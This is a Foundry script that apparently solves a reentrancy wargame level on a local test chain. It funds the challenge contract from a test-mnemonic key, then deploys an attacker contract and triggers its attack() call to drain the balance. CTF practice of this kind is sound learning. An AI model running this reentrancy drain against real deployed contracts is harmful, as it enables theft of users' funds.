// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import {Script} from "@forge-std/Script.sol";
import {Reentrance} from "@main-0_6_x/10_Reentrance.sol";
import {ReentranceAttacker} from "@main-0_6_x/10_ReentranceAttacker.sol";

contract SolveReentranceScript is Script {

    Reentrance reentranceChallenge = Reentrance( payable(address(0x8464135c8F25Da09e49BC8782676a84730C318bC)) );
    ReentranceAttacker reentranceAttacker;

    function run() public {

        string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 funderPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 3); 
        address funder = vm.addr(funderPrivateKey);

        vm.startBroadcast(funderPrivateKey);

        reentranceChallenge.donate{value: 10 ether}(funder);

        vm.stopBroadcast();

        // uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        // string memory mnemonic = vm.envString("MNEMONIC");

        // address is already funded with ETH
        // string memory mnemonic ="test test test test test test test test test test test junk";
        uint256 attackerPrivateKey = vm.deriveKey(mnemonic, "m/44'/60'/0'/0/", 2); //  address = 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
        // address attacker = vm.addr(attackerPrivateKey);

        vm.startBroadcast(attackerPrivateKey);

        reentranceAttacker = new ReentranceAttacker(address(reentranceChallenge));

        reentranceAttacker.attack{value: 0.2 ether}();
        // reentranceAttacker.withdrawETH( payable(attacker),  address(reentranceAttacker).balance);


        vm.stopBroadcast();
    }
}
